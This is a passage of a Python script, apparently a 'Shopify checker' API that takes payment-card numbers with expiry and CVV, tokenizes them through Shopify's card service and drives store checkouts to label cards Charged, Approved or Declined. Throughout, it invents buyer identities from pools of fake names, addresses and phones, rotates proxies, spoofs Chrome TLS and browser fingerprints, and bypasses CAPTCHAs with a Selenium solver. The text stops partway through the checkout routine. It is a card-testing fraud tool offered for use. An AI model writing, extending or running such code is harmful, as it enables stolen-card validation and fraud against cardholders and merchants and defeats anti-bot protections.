#!/usr/bin/env python3
"""
Shopify Checker API - Full standalone script
Endpoint: GET /shopify?site=...&cc=...&proxy=...
"""

import asyncio
import random
import time as _time
import httpx
import re
import json
from datetime import datetime
from urllib.parse import urlparse, quote
import sys
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
from typing import Optional
import uvicorn

# ------------------------------------------------------------
# ORIGINAL SCRIPT (copied in full, no modifications)
# ------------------------------------------------------------

try:
    sys.stdout.reconfigure(encoding='utf-8')
except AttributeError:
    pass

# ── Selenium CAPTCHA solver (auto-bypass Shopify checkpoint) ──────────
_CAPTCHA_SOLVER_AVAILABLE = False
try:
    from captcha_solver import solve_shopify_captcha, is_solver_available, get_solver_status, get_cached_cookies
    _CAPTCHA_SOLVER_AVAILABLE = True
    print("[shopifyapi] ✅ Selenium CAPTCHA solver loaded")
except ImportError:
    print("[shopifyapi] ⚠️ captcha_solver not available — CAPTCHA bypass disabled")

# ── curl_cffi: Chrome TLS fingerprint impersonation ──────────────────────
_CURL_CFFI_AVAILABLE = False
try:
    from curl_cffi.requests import AsyncSession as _CurlAsyncSession
    _CURL_CFFI_AVAILABLE = True
    print("[shopifyapi] ✅ curl_cffi loaded — Chrome TLS fingerprint active")
except ImportError:
    print("[shopifyapi] ⚠️ curl_cffi not installed — using httpx (CAPTCHA risk higher)")

_CHROME_TO_IMPERSONATE = {"136": "chrome136", "133": "chrome133a", "131": "chrome131", "124": "chrome124", "123": "chrome123", "120": "chrome120"}
_CURL_IMPERSONATE = list(_CHROME_TO_IMPERSONATE.values())

_H2_AVAILABLE = False
try:
    import h2  # noqa: F401
    _H2_AVAILABLE = True
except ImportError:
    pass

class _CurlSessionWrapper:
    def __init__(self, session):
        self._s = session

    @staticmethod
    def _clean_headers(headers):
        if not headers:
            return headers
        cleaned = {}
        for k, v in headers.items():
            if isinstance(v, str):
                cleaned[k] = v.encode('ascii', errors='ignore').decode('ascii')
            else:
                cleaned[k] = v
        return cleaned

    async def get(self, url, **kwargs):
        if 'headers' in kwargs:
            kwargs['headers'] = self._clean_headers(kwargs['headers'])
        return await self._s.get(url, **kwargs)

    async def post(self, url, **kwargs):
        if 'headers' in kwargs:
            kwargs['headers'] = self._clean_headers(kwargs['headers'])
        return await self._s.post(url, **kwargs)

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self._s.close()

def _create_async_client(proxy_url=None, timeout=30.0, chrome_version=None):
    if _CURL_CFFI_AVAILABLE:
        if chrome_version and chrome_version in _CHROME_TO_IMPERSONATE:
            impersonate = _CHROME_TO_IMPERSONATE[chrome_version]
        else:
            impersonate = random.choice(_CURL_IMPERSONATE)
        kw = {
            "impersonate": impersonate,
            "allow_redirects": True,
            "timeout": timeout,
            "verify": False,
        }
        if proxy_url:
            kw["proxy"] = proxy_url
        session = _CurlAsyncSession(**kw)
        return _CurlSessionWrapper(session)
    else:
        client_kw = {
            "follow_redirects": True,
            "timeout": httpx.Timeout(timeout, connect=8.0, read=25.0, write=8.0, pool=5.0),
            "limits": httpx.Limits(max_connections=100, max_keepalive_connections=20),
            "http2": _H2_AVAILABLE,
        }
        if proxy_url:
            client_kw["proxy"] = proxy_url
        return httpx.AsyncClient(**client_kw)

_NETWORK_ERRORS = (
    httpx.RemoteProtocolError, httpx.ConnectError, httpx.ReadTimeout,
    httpx.ProxyError, httpx.ConnectTimeout, httpx.WriteTimeout,
    httpx.TimeoutException,
    ConnectionResetError, ConnectionAbortedError, OSError,
)
if _CURL_CFFI_AVAILABLE:
    try:
        from curl_cffi.requests.errors import RequestsError as _CurlRequestsError
        _NETWORK_ERRORS = _NETWORK_ERRORS + (_CurlRequestsError,)
    except ImportError:
        pass

def format_proxy(proxy_string):
    if not proxy_string or not proxy_string.strip():
        return None
    s = proxy_string.strip()
    if s.startswith(("http://", "https://", "socks4://", "socks5://")):
        return s
    if "@" in s:
        auth, host_port = s.split("@", 1)
        return f"http://{auth}@{host_port}"
    if ":" in s:
        parts = s.split(":")
        if len(parts) >= 4:
            host, port, user, pwd = parts[0], parts[1], ":".join(parts[2:-1]), parts[-1]
            if port.isdigit():
                return f"http://{quote(user, safe='')}:{quote(pwd, safe='')}@{host}:{port}"
        if len(parts) == 2 and parts[1].isdigit():
            return f"http://{parts[0]}:{parts[1]}"
    return None

def load_proxy_list(source):
    if not source or not source.strip():
        return []
    s = source.strip()
    if s.lower().startswith("file:"):
        path = s[5:].strip()
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if line.strip()]
            return [p for line in lines for p in [format_proxy(line)] if p]
        except Exception as e:
            print(f"   ⚠️ Could not load proxy file: {e}")
            return []
    return [p for part in s.split(",") for p in [format_proxy(part.strip())] if p]

def get_random_fingerprint():
    return _build_fingerprint_from_pools()

_FP_CHROME_BUILDS = {
    "136": "136.0.7103.93",
    "133": "133.0.6943.126",
    "131": "131.0.6778.85",
    "124": "124.0.6367.118",
    "123": "123.0.6312.86",
    "120": "120.0.6099.109",
}
_FP_CHROME_VERSIONS = tuple(_FP_CHROME_BUILDS.keys())
_FP_CHROME_WIN = [f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{build} Safari/537.36" for build in _FP_CHROME_BUILDS.values()]
_FP_CHROME_MAC = [f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{build} Safari/537.36" for build in _FP_CHROME_BUILDS.values()]
_FP_CHROME_ANDROID = [f"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{build} Mobile Safari/537.36" for build in _FP_CHROME_BUILDS.values()]
_FP_ALL_UAS = _FP_CHROME_WIN + _FP_CHROME_MAC + _FP_CHROME_ANDROID

_FP_ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,de;q=0.8", "en-US,en;q=0.9,pt;q=0.7", "en-GB,en;q=0.9",
    "en-GB,en;q=0.9,fr;q=0.8", "en-CA,en;q=0.9,fr;q=0.8", "en-AU,en;q=0.9",
]

_FP_CHROME_BRANDS_MAP = {
    "136": ('"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"', '"Chromium";v="136.0.7103.93", "Google Chrome";v="136.0.7103.93", "Not.A/Brand";v="99.0.0.0"'),
    "133": ('"Not?A_Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"', '"Not?A_Brand";v="99.0.0.0", "Google Chrome";v="133.0.6943.126", "Chromium";v="133.0.6943.126"'),
    "131": ('"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', '"Google Chrome";v="131.0.6778.85", "Chromium";v="131.0.6778.85", "Not_A Brand";v="24.0.0.0"'),
    "124": ('"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', '"Chromium";v="124.0.6367.118", "Google Chrome";v="124.0.6367.118", "Not-A.Brand";v="99.0.0.0"'),
    "123": ('"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', '"Google Chrome";v="123.0.6312.86", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.86"'),
    "120": ('"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.109", "Google Chrome";v="120.0.6099.109"'),
}

_FP_PLATFORMS = [('"Windows"', "?0"), ('"macOS"', "?0"), ('"Android"', "?1")]
_FP_VIEWPORTS = ["1920x1080", "1366x768", "1536x864", "1440x900", "1280x720", "2560x1440", "1600x900", "1920x1200", "1680x1050", "3840x2160", "1280x800", "1280x1024", "1360x768", "2560x1600"]
_FP_ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
]

_RE_CHROME_VER = re.compile(r'Chrome/(\d+)')

_POOL_ADDRESSES = (
    {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
    {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
    {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
    {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
    {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"},
    {"add1": "1200 Market St", "city": "Wilmington", "state": "Delaware", "state_short": "DE", "zip": "19801"},
    {"add1": "950 Penn Ave", "city": "Dover", "state": "Delaware", "state_short": "DE", "zip": "19901"},
    {"add1": "88 Broad St", "city": "Burlington", "state": "Vermont", "state_short": "VT", "zip": "05401"},
    {"add1": "222 State St", "city": "Montpelier", "state": "Vermont", "state_short": "VT", "zip": "05602"},
    {"add1": "415 Congress St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
    {"add1": "77 Park Ave", "city": "Nashua", "state": "New Hampshire", "state_short": "NH", "zip": "03060"},
    {"add1": "300 Elm St", "city": "Manchester", "state": "New Hampshire", "state_short": "NH", "zip": "03101"},
    {"add1": "55 Hope St", "city": "Providence", "state": "Rhode Island", "state_short": "RI", "zip": "02906"},
    {"add1": "180 Angell St", "city": "Providence", "state": "Rhode Island", "state_short": "RI", "zip": "02906"},
    {"add1": "42 College St", "city": "New Haven", "state": "Connecticut", "state_short": "CT", "zip": "06510"},
    {"add1": "600 Trumbull St", "city": "Hartford", "state": "Connecticut", "state_short": "CT", "zip": "06103"},
    {"add1": "101 Federal St", "city": "Boston", "state": "Massachusetts", "state_short": "MA", "zip": "02110"},
    {"add1": "250 Northern Ave", "city": "Boston", "state": "Massachusetts", "state_short": "MA", "zip": "02210"},
    {"add1": "33 Warwick Ave", "city": "Cranston", "state": "Rhode Island", "state_short": "RI", "zip": "02910"},
    {"add1": "710 Main St", "city": "Stamford", "state": "Connecticut", "state_short": "CT", "zip": "06901"},
    {"add1": "1425 Broadway", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10018"},
    {"add1": "350 5th Ave", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10118"},
    {"add1": "200 Park Ave", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10166"},
    {"add1": "1600 Vine St", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90028"},
    {"add1": "8500 Beverly Blvd", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90048"},
    {"add1": "233 S Wacker Dr", "city": "Chicago", "state": "Illinois", "state_short": "IL", "zip": "60606"},
    {"add1": "875 N Michigan Ave", "city": "Chicago", "state": "Illinois", "state_short": "IL", "zip": "60611"},
    {"add1": "1500 Market St", "city": "Philadelphia", "state": "Pennsylvania", "state_short": "PA", "zip": "19102"},
    {"add1": "401 N Broad St", "city": "Philadelphia", "state": "Pennsylvania", "state_short": "PA", "zip": "19108"},
    {"add1": "2000 McKinney Ave", "city": "Dallas", "state": "Texas", "state_short": "TX", "zip": "75201"},
    {"add1": "500 Main St", "city": "Houston", "state": "Texas", "state_short": "TX", "zip": "77002"},
    {"add1": "100 Peachtree St", "city": "Atlanta", "state": "Georgia", "state_short": "GA", "zip": "30303"},
    {"add1": "191 Peachtree St NE", "city": "Atlanta", "state": "Georgia", "state_short": "GA", "zip": "30303"},
    {"add1": "701 Brickell Ave", "city": "Miami", "state": "Florida", "state_short": "FL", "zip": "33131"},
    {"add1": "200 S Orange Ave", "city": "Orlando", "state": "Florida", "state_short": "FL", "zip": "32801"},
    {"add1": "1201 3rd Ave", "city": "Seattle", "state": "Washington", "state_short": "WA", "zip": "98101"},
    {"add1": "400 Pine St", "city": "Seattle", "state": "Washington", "state_short": "WA", "zip": "98101"},
    {"add1": "1000 SW Broadway", "city": "Portland", "state": "Oregon", "state_short": "OR", "zip": "97205"},
    {"add1": "750 E Pratt St", "city": "Baltimore", "state": "Maryland", "state_short": "MD", "zip": "21202"},
    {"add1": "1100 Wilson Blvd", "city": "Arlington", "state": "Virginia", "state_short": "VA", "zip": "22209"},
)

_POOL_FIRST_NAMES = (
    "John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa",
    "James", "Jennifer", "Robert", "Amanda", "Daniel", "Ashley", "Matthew",
    "Megan", "Andrew", "Lauren", "Ryan", "Rachel", "Joshua", "Stephanie",
    "Christopher", "Nicole", "Brandon", "Elizabeth", "Tyler", "Heather",
    "Kevin", "Samantha", "Brian", "Kimberly", "Nathan", "Melissa",
    "Jacob", "Hannah", "Ethan", "Olivia", "Noah", "Sophia", "Liam", "Emma",
    "Mason", "Ava", "Logan", "Isabella", "Lucas", "Mia", "Aiden", "Charlotte",
    "Caleb", "Amelia", "Jack", "Harper", "Owen", "Evelyn", "Luke", "Abigail",
    "Henry", "Ella", "Sebastian", "Scarlett", "Carter", "Grace", "Wyatt", "Chloe",
    "Dylan", "Victoria", "Gabriel", "Riley", "Julian", "Aria", "Levi", "Lily",
    "Isaac", "Aurora", "Lincoln", "Zoey", "Jaxon", "Nora", "Asher", "Camila",
    "Theodore", "Penelope", "Leo", "Layla", "Thomas", "Paisley", "Charles", "Savannah",
    "Marcus", "Allison", "Patrick", "Natalie", "Peter", "Hazel", "George", "Violet",
)

_POOL_LAST_NAMES = (
    "Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis",
    "Martinez", "Anderson", "Taylor", "Thomas", "Jackson", "White",
    "Harris", "Clark", "Lewis", "Robinson", "Walker", "Young",
    "Allen", "King", "Wright", "Scott", "Green", "Baker",
    "Adams", "Nelson", "Hill", "Campbell", "Mitchell", "Roberts",
    "Carter", "Phillips", "Evans", "Turner", "Torres", "Parker",
    "Collins", "Edwards", "Stewart", "Flores", "Morris", "Nguyen",
    "Murphy", "Rivera", "Cook", "Rogers", "Morgan", "Peterson",
    "Cooper", "Reed", "Bailey", "Bell", "Gomez", "Kelly",
    "Howard", "Ward", "Cox", "Diaz", "Richardson", "Wood",
    "Watson", "Brooks", "Bennett", "Gray", "James", "Reyes",
    "Cruz", "Hughes", "Price", "Myers", "Long", "Foster",
)

_POOL_EMAIL_DOMAINS = (
    "gmail.com", "yahoo.com", "outlook.com", "icloud.com",
    "hotmail.com", "aol.com", "protonmail.com", "mail.com",
    "live.com", "msn.com", "ymail.com", "me.com",
    "comcast.net", "att.net", "verizon.net", "cox.net",
)

_POOL_PHONES = (
    "2025550199", "3105551234", "4155559876", "6175550123",
    "9718081573", "2125559999", "7735551212", "4085556789",
    "5035559012", "6025553456", "7025557890", "8015551234",
    "2145555678", "3035559012", "4045553456", "5125557890",
    "6155551234", "7165555678", "8185559012", "9195553456",
    "2675557890", "3125551234", "4155555678", "5035559012",
)

def _build_fingerprint_from_pools():
    ua = random.choice(_FP_ALL_UAS)
    _ver_m = _RE_CHROME_VER.search(ua)
    chrome_ver = _ver_m.group(1) if _ver_m else "136"
    brand_entry = _FP_CHROME_BRANDS_MAP.get(chrome_ver, _FP_CHROME_BRANDS_MAP["136"])
    ch_ua, ch_ua_full = brand_entry
    if "Android" in ua or "Mobile" in ua:
        platform, mobile = '"Android"', "?1"
    elif "Macintosh" in ua or "Mac OS" in ua:
        platform, mobile = '"macOS"', "?0"
    else:
        platform, mobile = '"Windows"', "?0"
    fp = {
        "_chrome_ver": chrome_ver,
        "User-Agent": ua,
        "Accept-Language": random.choice(_FP_ACCEPT_LANGS),
        "Accept": random.choice(_FP_ACCEPTS),
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Priority": "u=0, i",
        "viewport": random.choice(_FP_VIEWPORTS),
        "screen-depth": random.choice(["24", "32"]),
        "Sec-Ch-Ua": ch_ua,
        "Sec-Ch-Ua-Mobile": mobile,
        "Sec-Ch-Ua-Platform": platform,
    }
    if random.random() < 0.5:
        fp["Sec-Ch-Ua-Full-Version-List"] = ch_ua_full
    if random.random() < 0.2:
        fp["DNT"] = "1"
    return fp

def find_between(s, start, end):
    try:
        i = s.find(start)
        if i == -1:
            return ""
        i += len(start)
        j = s.find(end, i)
        if j == -1:
            return ""
        return s[i:j]
    except Exception:
        return ""

_RE_SESSION_TOKEN = re.compile(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"')
_RE_DELIVERY_LINE_1 = re.compile(r'"deliveryLineStableId"\s*:\s*"([^"]+)"')
_RE_DELIVERY_LINE_2 = re.compile(r'"deliveryGroupStableId"\s*:\s*"([^"]+)"')
_RE_DELIVERY_LINE_3 = re.compile(r"deliveryLineStableId['\"]\s*:\s*['\"]([^'\"]+)['\"]")
_RE_DELIVERY_LINE_4 = re.compile(r'deliveryLines&quot;:\[\{&quot;stableId&quot;:&quot;([^&]+)&quot;')
_RE_DELIVERY_LINE_5 = re.compile(r'"deliveryLines"\s*:\s*\[\s*\{\s*"stableId"\s*:\s*"([^"]+)"')
_RE_DELIVERY_METHOD = re.compile(r'deliveryMethodTypes&quot;:\[&quot;([^&]+)&quot;')
_RE_DELIVERY_METHOD_2 = re.compile(r'"deliveryMethodTypes"\s*:\s*\[\s*"([^"]+)"')
_RE_DELIVERY_STRATEGY = re.compile(r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"')

def _extract_delivery_line_stable_id(html_text):
    if not html_text:
        return None
    v = find_between(html_text, 'deliveryLineStableId&quot;:&quot;', '&quot;')
    if v:
        return v
    v = find_between(html_text, 'deliveryGroupStableId&quot;:&quot;', '&quot;')
    if v:
        return v
    m = _RE_DELIVERY_LINE_1.search(html_text)
    if m:
        return m.group(1)
    m = _RE_DELIVERY_LINE_2.search(html_text)
    if m:
        return m.group(1)
    m = _RE_DELIVERY_LINE_3.search(html_text)
    if m:
        return m.group(1)
    m = _RE_DELIVERY_LINE_4.search(html_text)
    if m:
        return m.group(1)
    m = _RE_DELIVERY_LINE_5.search(html_text)
    if m:
        return m.group(1)
    return None

def _detect_requires_shipping(html_text):
    if not html_text:
        return None
    m = _RE_DELIVERY_METHOD.search(html_text)
    if m:
        return m.group(1) != 'NONE'
    m = _RE_DELIVERY_METHOD_2.search(html_text)
    if m:
        return m.group(1) != 'NONE'
    if 'requiresShipping&quot;:false' in html_text or '"requiresShipping":false' in html_text:
        return False
    if 'requiresShipping&quot;:true' in html_text or '"requiresShipping":true' in html_text:
        return True
    return None

def _extract_delivery_strategy_handle(html_text):
    if not html_text:
        return None
    v = find_between(html_text, 'selectedDeliveryStrategy&quot;:{&quot;handle&quot;:&quot;', '&quot;')
    if v:
        return v
    m = _RE_DELIVERY_STRATEGY.search(html_text)
    if m:
        return m.group(1)
    return None

_FALLBACK_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36"
_HEADER_FILTER_FULL = frozenset({"user-agent", "accept", "accept-language", "accept-encoding",
    "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform", "sec-ch-ua-full-version-list",
    "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
    "upgrade-insecure-requests", "cache-control", "connection", "priority"})
_HEADER_FILTER_SMALL = frozenset({"user-agent", "accept", "accept-language",
    "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"})

class ShopifyAuto:
    def __init__(self, fingerprint=None):
        if fingerprint:
            self.user_agent = fingerprint.get("User-Agent") or fingerprint.get("user-agent") or _FALLBACK_UA
            self.fingerprint = fingerprint
        else:
            self.user_agent = _FALLBACK_UA
            self.fingerprint = {}
        self.last_price = None

    async def tokenize_card(self, session, cc, mon, year, cvv, first, last):
        try:
            url = "https://deposit.us.shopifycs.com/sessions"
            payload = {
                "credit_card": {
                    "number": str(cc).replace(" ", ""),
                    "name": f"{first} {last}",
                    "month": int(mon),
                    "year": int(year),
                    "verification_value": str(cvv)
                }
            }
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': 'https://checkout.shopifycs.com',
                'User-Agent': self.user_agent
            }
            r = await session.post(url, json=payload, headers=headers)
            if r.status_code == 200:
                return r.json().get('id')
            else:
                print(f"❌ Failed to tokenize card: {r.text}")
                return None
        except Exception as e:
            print(f"❌ Tokenization error: {e}")
            return None

    def get_random_info(self):
        address = random.choice(_POOL_ADDRESSES)
        first_name = random.choice(_POOL_FIRST_NAMES)
        last_name = random.choice(_POOL_LAST_NAMES)
        email_domain = random.choice(_POOL_EMAIL_DOMAINS)
        _fmt = random.randint(0, 4)
        if _fmt == 0:
            email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 9999)}@{email_domain}"
        elif _fmt == 1:
            email = f"{first_name.lower()}{last_name.lower()}{random.randint(10, 999)}@{email_domain}"
        elif _fmt == 2:
            email = f"{first_name.lower()[0]}{last_name.lower()}{random.randint(1, 99)}@{email_domain}"
        elif _fmt == 3:
            email = f"{first_name.lower()}_{last_name.lower()}{random.randint(1, 9999)}@{email_domain}"
        else:
            email = f"{last_name.lower()}.{first_name.lower()}{random.randint(1, 999)}@{email_domain}"
        phone = random.choice(_POOL_PHONES)
        return {
            "fname": first_name,
            "lname": last_name,
            "email": email,
            "phone": phone,
            "add1": address["add1"],
            "city": address["city"],
            "state": address["state"],
            "state_short": address["state_short"],
            "zip": address["zip"]
        }

_POLL_QUERY = "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}"

_CAPTCHA_MAX_RETRIES = 1
_MAX_CONCURRENT_CHECKS = 30
_check_semaphore = None
_active_checks = 0

def get_active_checks():
    return _active_checks

def _is_captcha_result(result):
    if not result or not isinstance(result, dict):
        return False
    code = str(result.get("error_code", "")).upper()
    msg = str(result.get("message", "")).upper()
    return "CAPTCHA" in code or "CAPTCHA" in msg or "CHECKPOINT" in code or "CHECKPOINT" in msg

async def run_shopify_check(site_url, card_str, proxy_url=None, verbose=False, discord_console_webhook=None, timeout=120.0, max_captcha_retries=None):
    global _active_checks, _check_semaphore
    if _check_semaphore is None:
        _check_semaphore = asyncio.Semaphore(_MAX_CONCURRENT_CHECKS)
    async with _check_semaphore:
        _active_checks += 1
        try:
            return await _run_shopify_check_inner(site_url, card_str, proxy_url, verbose, discord_console_webhook, timeout, max_captcha_retries=max_captcha_retries)
        finally:
            _active_checks -= 1

async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=False, discord_console_webhook=None, timeout=120.0, max_captcha_retries=None):
    site_url = site_url.strip().rstrip("/")
    parts = card_str.strip().replace(" ", "").split("|")
    if len(parts) != 4:
        return {"status": "Error", "message": "Invalid format. Use cc|mm|yy|cvv"}
    cc, mon, year, cvv = parts[0], parts[1], parts[2], parts[3]
    timeout = max(float(timeout), 60.0)
    proxy_list = []
    if proxy_url:
        if "," in proxy_url:
            proxy_list = [format_proxy(p.strip()) for p in proxy_url.split(",") if p.strip()]
            proxy_list = [p for p in proxy_list if p]
        else:
            formatted = format_proxy(proxy_url)
            if formatted:
                proxy_list = [formatted]
    captcha_retries = max_captcha_retries if max_captcha_retries is not None else _CAPTCHA_MAX_RETRIES
    proxy_use = random.choice(proxy_list) if proxy_list else None
    fingerprint = get_random_fingerprint()
    try:
        async with _create_async_client(proxy_url=None, timeout=20.0, chrome_version=fingerprint.get("_chrome_ver")) as session:
            if _CAPTCHA_SOLVER_AVAILABLE:
                try:
                    cached = get_cached_cookies(site_url)
                    if cached:
                        injected = 0
                        for cname, cval in cached.items():
                            try:
                                if hasattr(session, '_s') and hasattr(session._s, 'cookies'):
                                    session._s.cookies.set(cname, str(cval))
                                    injected += 1
                                elif hasattr(session, 'cookies'):
                                    session.cookies.set(cname, str(cval))
                                    injected += 1
                            except Exception:
                                pass
                except Exception:
                    pass
            result = await asyncio.wait_for(
                _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=proxy_use, verbose=verbose, discord_console_webhook=discord_console_webhook),
                timeout=float(timeout),
            )
    except asyncio.TimeoutError:
        result = {"status": "Error", "message": "Timeout"}
    except Exception as e:
        result = {"status": "Error", "message": str(e)[:200]}
    if _is_captcha_result(result) and captcha_retries > 0 and _CAPTCHA_SOLVER_AVAILABLE:
        _log_verbose(verbose, "🤖 CAPTCHA detected — attempting Selenium bypass...", discord_webhook=discord_console_webhook)
        checkout_url = result.get("_checkout_url") or f"{site_url}/checkout"
        try:
            solver_result = await solve_shopify_captcha(
                checkout_url=checkout_url,
                proxy_url=proxy_use,
                timeout=55,
            )
            if solver_result.get("solved"):
                browser_html = solver_result.get("page_html", "")
                browser_url = solver_result.get("final_url", "")
                browser_cookies = solver_result.get("cookies", {})
                browser_session_token = solver_result.get("session_token")
                from captcha_solver import do_full_browser_checkout
                info2 = ShopifyAuto().get_random_info()
                browser_result = await do_full_browser_checkout(
                    cc=cc, mon=mon, year=year, cvv=cvv,
                    info=info2,
                    timeout=45
                )
                result = browser_result
                if result.get("status") in ("Charged", "Declined", "Approved") and browser_cookies:
                    try:
                        from captcha_solver import cache_cookies
                        cache_cookies(site_url, browser_cookies)
                    except Exception:
                        pass
        except Exception as e:
            _log_verbose(verbose, f"⚠️ Selenium solver exception: {str(e)[:100]}", discord_webhook=discord_console_webhook)
    return result

def _log_verbose(verbose, msg, discord_webhook=None):
    if verbose:
        important_keywords = [
            "Result:", "CAPTCHA", "Timeout", "Error", "Declined", "Approved",
            "Charged", "Failed", "3DS", "CARD_DECLINED", "GENERIC_ERROR",
            "Check start", "Check done"
        ]
        if any(keyword in msg for keyword in important_keywords):
            line = f"[{datetime.now().strftime('%H:%M:%S')}] [gg] {msg}"
            print(line)

_products_cache = {}
_PRODUCTS_CACHE_TTL = 60
_PRODUCTS_CACHE_MAX = 200

def _get_cached_products(site_url):
    entry = _products_cache.get(site_url)
    if entry and _time.time() - entry["ts"] < _PRODUCTS_CACHE_TTL:
        return entry["data"]
    return None

def _set_cached_products(site_url, products):
    _products_cache[site_url] = {"data": products, "ts": _time.time()}
    if len(_products_cache) > _PRODUCTS_CACHE_MAX:
        now = _time.time()
        stale = [k for k, v in _products_cache.items() if now - v["ts"] > _PRODUCTS_CACHE_TTL]
        for k in stale:
            _products_cache.pop(k, None)

def _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=True, delivery_option_handle=None, requires_shipping=True, delivery_strategy_handle=None):
    if not requires_shipping:
        line = {
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments": {"any": True}
                },
                "options": {}
            },
            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
            "deliveryMethodTypes": ["NONE"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": False,
        }
        if delivery_line_stable_id:
            line["stableId"] = delivery_line_stable_id
        return {
            "deliveryLines": [line],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
        }
    strategy = {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}
    if delivery_option_handle:
        strategy = {
            "selectedDeliveryOptions": [{"handle": delivery_option_handle}],
            "deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}},
            "options": {},
        }
    line = {
        "selectedDeliveryStrategy": strategy,
        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
        "destination": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {"any": True},
        "destinationChanged": destination_changed,
    }
    if delivery_line_stable_id:
        line["stableId"] = delivery_line_stable_id
    return {
        "deliveryLines": [line],
        "noDeliveryRequired": [],
        "useProgressiveRates": False,
        "prefetchShippingRatesStrategy": None,
    }

async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, proxy_url=None, verbose=False, discord_console_webhook=None):
    site = site_url
    shop = ShopifyAuto(fingerprint=fingerprint)
    last_completion = None
    last_graphql_errors = None
    _steps = []
    product_header = {k: v for k, v in fingerprint.items() if k.lower() in _HEADER_FILTER_FULL}
    if not any(k.lower() == "user-agent" for k in product_header):
        product_header["User-Agent"] = shop.user_agent
    try:
        _home_headers = {k: v for k, v in product_header.items()}
        _home_headers["Sec-Fetch-Dest"] = "document"
        _home_headers["Sec-Fetch-Mode"] = "navigate"
        _home_headers["Sec-Fetch-Site"] = "none"
        _home_headers["Sec-Fetch-User"] = "?1"
        await session.get(site, headers=_home_headers)
